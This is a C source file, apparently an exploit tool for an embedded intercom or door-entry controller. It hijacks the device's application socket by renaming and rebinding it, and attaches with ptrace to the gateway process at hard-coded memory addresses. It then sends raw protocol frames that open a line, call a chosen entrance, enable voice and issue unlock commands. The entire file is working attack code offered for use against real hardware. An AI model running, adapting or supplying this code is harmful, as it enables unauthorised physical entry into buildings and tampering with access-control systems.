#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>


#define GTL_PORT "/tmp/.socket/gtl_port"
#define APP_PORT "/tmp/.socket/appli_port"

#define WAIT_CHAN 0 
#define WAIT_CMD_CALL 1
#define WAIT_VOICE 2
#define WAIT_UNLOCK 3

#define ADDRESS_OF_STATION_ID 0x0042a75c
#define ADDRESS_OF_FD 0x00428ab4
#define ADDRESS_OF_BUFFER_LOC 0x004144b0

// Guard 2 - 1 is taken by gateway
#define DESIRED 0xe02 
#define US 0x85a

int restore;

char state = WAIT_CHAN;

// open channel
char cmd_open_channel[103] = {0x01, 0x01, 0x01, 0x02};
char resp_open_channel[] = {0x01, 0x05, 0x1b, 0x01};
// 01 05 1b 01 //ResLineUse
// 00 19 1b 00 //ResOKMon



// open entrace 3
char cmd_call[103] = {0x01, 0x0e, 0x01, 0x03};
char resp_call[] = {0x00, 0x19, 0x1b, 0x00};

// 01 27 1b 01 // infosgcamera
// 02 26 1b 17 0e - info ptz


// trigger voice mode
char cmd_enable_voice[103] = {0x00, 0x14, 0x01};
char resp_enable_voice[] = {0x01, 0x15, 0x1b};
//00 0b 1b ntfinuse
//01 15 1b  nfttalk
// 01 27 1b 01 // ntfinfosgcamera

// unlock
char cmd_unlock_b[103] = {0x00, 0x0b, 0x01};
char cmd_unlock_c[103] = {0x00, 0x0c, 0x01};

// hangup
char hangup[103] = {0x00, 0x09, 0x01};
char resp_hangup[] = {0x00, 0x0c, 0x1b};
// 00 18 1b ntfendtalk
// 00 0c 1b

int pid_to_hook;

// socket that we need to write to clean up
int sfd;
struct pollfd sfds[1];
struct sockaddr_un svaddr, claddr, rxaddr;

char newName[255];
char oldName[255];

#define BUF_SIZE 150


struct pt_regs regs;

void hook(){
    int data;
    int regsa;
    int x, y;
    int fd;
    int atdata;
   // printf("Starting ID change\n");
    int k;

    for(k=0;k<10;k++){
        ptrace(PTRACE_ATTACH, pid_to_hook, NULL, NULL);
        ptrace(PTRACE_SYSCALL, pid_to_hook, NULL, NULL);

        usleep(10000);
        //waitpid(pid_to_hook, NULL, 0);
       // printf("Attached to pid\n");
        
        restore = ptrace(PTRACE_PEEKDATA,pid_to_hook, ADDRESS_OF_STATION_ID, NULL);
        //printf("restore: %x\n",restore);

        // data =  ptrace(PTRACE_PEEKDATA,pid_to_hook, ADDRESS_OF_BUFFER_LOC, NULL);
        // printf("data: %x\n",data);

        fd =  ptrace(PTRACE_PEEKDATA,pid_to_hook, ADDRESS_OF_FD, NULL);
        //printf("fd: %x\n",data);

        
        
        
        ptrace(PTRACE_GETREGS, pid_to_hook, NULL, &regs);
        if (regs.regs[3] == 0x36 && regs.regs[4] == 4){
            //printf("Detected ioctl for sndset\n");
            for(x=0;x<16;x++){
            
                data = regs.regs[x];
                
                //printf("r%d: %x\n",x,data);

                
                if (x == 11){
                    for(y=0;y<32;y++){
                        atdata =  ptrace(PTRACE_PEEKDATA,pid_to_hook, data+(y*4), NULL);
                        printf(" %x", atdata);
                    }
                    printf("\n");
                    // int us=0;
                    // atdata =  ptrace(PTRACE_PEEKDATA,pid_to_hook, data+(3*4), NULL);
                    // printf("%02x", (atdata >> 8)&0xff);
                    // printf("%02x", (atdata >> 16)&0xff);
                    // printf("%02x", (atdata >> 24)&0xff);
                    // if ((atdata >> 8)&0xffff == US) {
                    //     us=1;
                    // }
                    // atdata =  ptrace(PTRACE_PEEKDATA,pid_to_hook, data+(4*4), NULL);
                    // printf("%02x", (atdata)&0xff);
                    // printf("%02x", (atdata >> 8)&0xff);
                    // printf("%02x", (atdata >> 16)&0xff);
                    // printf("%02x", (atdata >> 24)&0xff);               
                    // printf("\n");
                    // printf("us!\n");
                }

            }
            // ptrace(PTRACE_DETACH, pid_to_hook, NULL, NULL);
            // break;
        }

         //break;

    }
    ptrace(PTRACE_DETACH, pid_to_hook, NULL, NULL);
}

void singalHandler(int sig)  { 
    int poll_result;
    int numBytes;
    char resp[BUF_SIZE];
    int sockaddr_size;
    sockaddr_size = sizeof(struct sockaddr_un);
    int x;

    printf("Starting ID change\n");
    ptrace(PTRACE_ATTACH, pid_to_hook, NULL, NULL);
    ptrace(PTRACE_SYSCALL, pid_to_hook, NULL, NULL);
    wait(NULL);
    printf("Attached to pid\n");
    //ptrace(PTRACE_POKEDATA,pid_to_hook, ADDRESS_OF_STATION_ID, restore);
    printf("Set ID: %x\n", restore);
    ptrace(PTRACE_CONT, pid_to_hook, NULL, NULL);

    sendto(sfd, hangup, sizeof(hangup),0,(struct sockaddr  *) &svaddr, sizeof(struct sockaddr_un));
    hook();
    printf("sent hangup request - checking response\n");

    while (1){
        poll_result = poll(sfds,1,1000);
        if (!(sfds[0].revents & POLLIN)){
            printf("did not receive hang up :( line might be stuck open\n");
            break;
        }
        numBytes = recvfrom(sfd, resp, BUF_SIZE, 0, (struct sockaddr  *) &rxaddr, &sockaddr_size);
        
        if (memcmp(resp_hangup, resp, sizeof(resp_hangup)) == 0){
            printf("received hang up\n");
            break;
        } else {
            printf("Response %s %d:", rxaddr.sun_path,(int) numBytes);
            for (x=0;x<numBytes; x++){
                printf("%02x", resp[x]);
            }
        }
    }
    rename(newName, oldName);
    printf("exiting. renamed %s to %s\n", newName, oldName);
    exit(sig);
} 


int main(int argc, char *argv[]) {
    
    if (argc != 3){
        printf("Not enough args. Usage ./unlock {ps_gtl pid} {entrance n}");
        return 1;
    }

    

    pid_to_hook = atoi(argv[1]);
    cmd_call[3] = atoi(argv[2]);
    

    int poll_result;
    
    ssize_t numBytes;
    char resp[BUF_SIZE];
    int x;
    int sockaddr_size;
    sockaddr_size = sizeof(struct sockaddr_un);

    signal(SIGINT, singalHandler);
    

    snprintf(newName, sizeof(newName), "%s.%ld", APP_PORT, (long) getpid());
    snprintf(oldName, sizeof(oldName), "%s", APP_PORT);
    
    rename(oldName, newName);
   

    sfd = socket(AF_UNIX, SOCK_DGRAM, 1);
    sfds[0].fd = sfd;
    sfds[0].events = POLLIN;

    if (sfd == -1){
        printf("socket error\n");
        singalHandler(errno);
    }

    claddr.sun_family = AF_UNIX;
    snprintf(claddr.sun_path, sizeof(claddr.sun_path), "%s", oldName);
    
    if (bind(sfd, (struct sockaddr *) &claddr, sizeof(struct sockaddr_un)) == -1){
        printf("bind error\n");
        singalHandler(errno);
    }

    svaddr.sun_family = AF_UNIX;
    strncpy(svaddr.sun_path, GTL_PORT, sizeof(svaddr.sun_path)-1);
    

    
    printf("sending open\n");
    sendto(sfd, cmd_open_channel, sizeof(cmd_open_channel),0,(struct sockaddr  *) &svaddr, sizeof(struct sockaddr_un));
    hook();
    //hook();

     
    
    printf("Sent open channel\n");
    usleep(50*1000);

    while (1){
        poll_result = poll(sfds,1,200);
        if (!(sfds[0].revents & POLLIN)){
            printf("did not receive ResLineUse - trying anyway\n");
            break;
            //singalHandler(1);
        }
        numBytes = recvfrom(sfd, resp, BUF_SIZE, 0, (struct sockaddr  *) &rxaddr, &sockaddr_size);

        

        if (memcmp(resp_open_channel, resp, sizeof(resp_open_channel)) == 0){
            printf("received ResLineUse\n");
            break;
        } else {
            printf("Response %s %d:", rxaddr.sun_path,(int) numBytes);
            for (x=0;x<numBytes; x++){
                printf("%02x", resp[x]);
            }
        }
    }
    
    
    

    sendto(sfd, cmd_call, sizeof(cmd_call),0,(struct sockaddr  *) &svaddr, sizeof(struct sockaddr_un));
    hook();
    usleep(50*1000);

    while (1){
        poll_result = poll(sfds,1,1000);
        if (!(sfds[0].revents & POLLIN)){
            printf("did not receive res ok - trying anyway\n");
            break;
            //singalHandler(1);
        }
        numBytes = recvfrom(sfd, resp, BUF_SIZE, 0, (struct sockaddr  *) &rxaddr, &sockaddr_size);
        
        if (memcmp(resp_call, resp, sizeof(resp_call)) == 0){
            printf("received res ok mon\n");
            break;
        } else {
            printf("Response %s %d:", rxaddr.sun_path,(int) numBytes);
            for (x=0;x<numBytes; x++){
                printf("%02x", resp[x]);
            }
        }
    }
    


    sendto(sfd, cmd_enable_voice, sizeof(cmd_enable_voice),0,(struct sockaddr  *) &svaddr, sizeof(struct sockaddr_un));
    hook();
    usleep(50*1000);
    while (1){
        poll_result = poll(sfds,1,1000);
        if (!(sfds[0].revents & POLLIN)){
            printf("did not receive notify voice - continueing anyway\n");
            break;
            //singalHandler(1);
        }
        numBytes = recvfrom(sfd, resp, BUF_SIZE, 0, (struct sockaddr  *) &rxaddr, &sockaddr_size);
        
        if (memcmp(resp_enable_voice, resp, sizeof(resp_enable_voice)) == 0){
            printf("received talk\n");
            break;
        } else {
            printf("Response %s %d:", rxaddr.sun_path,(int) numBytes);
            for (x=0;x<numBytes; x++){
                printf("%02x", resp[x]);
            }
        }
    }
    


    sendto(sfd, cmd_unlock_b, sizeof(cmd_unlock_b),0,(struct sockaddr  *) &svaddr, sizeof(struct sockaddr_un));
    hook();
    usleep(150*1000);
    sendto(sfd, cmd_unlock_c, sizeof(cmd_unlock_c),0,(struct sockaddr  *) &svaddr, sizeof(struct sockaddr_un));
    hook();
    usleep(150*1000);
    printf("sent unlock command\n");
    sleep(2);

    singalHandler(0);
}
